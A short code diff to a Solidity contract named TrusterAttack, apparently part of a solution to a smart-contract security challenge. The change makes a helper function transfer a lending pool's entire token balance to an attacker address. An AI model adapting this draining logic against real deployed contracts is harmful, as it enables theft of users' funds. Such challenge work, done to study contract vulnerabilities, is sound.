@@ -42,8 +42,8 @@ contract TrusterAttack {
         //token.tranfser(amount,attacker)
         //
     }
-    function transferMe(address tokenAddress, address attackerAddress) public{
-        IERC20(tokenAddress).transfer(attackerAddress, balance);
+    function transferMe(address tokenAddress, address attackerAddress, address poolAddress) public{
+        IERC20(tokenAddress).transfer(attackerAddress, uint256(IERC20(tokenAddress).balanceOf(poolAddress)));
     }
 
    
